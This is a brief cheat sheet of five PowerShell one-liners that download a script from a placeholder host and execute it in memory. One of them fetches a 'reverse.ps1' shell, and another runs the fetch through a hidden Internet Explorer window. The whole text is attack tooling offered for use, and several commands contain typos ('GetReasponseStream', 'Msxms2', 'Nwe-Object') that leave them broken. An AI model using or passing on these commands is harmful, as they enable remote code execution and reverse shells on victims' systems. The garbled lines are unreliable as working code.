## POWERSHELL IN-MEMORY DOWNLOAD AND EXECUTE:  
1) iex(iwr'http://ip/file.ps1')  
2) $down=[System.NET.WebRequest]::Create("http://ip/file.ps1"); $read=$down.GetResponse(); IEX([System.IO.StreamReader]($read.GetReasponseStream())).ReadToEnd()  
3) $file=New-Object -ComObject Msxms2.XMLHTTP;$file.open('GET','http://ip/file.ps1',$false);$file.send();iex $file.responseText  
4) iex(New-Object Net.WebClient).DownloadString('http://ip/reverse.ps1')  
5) $ie=Nwe-Object -ComObject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('https://ip/reverse.ps1');sleep 5;$response=$ie.Document.body.innerHTML;$ie.quit();iex $response  


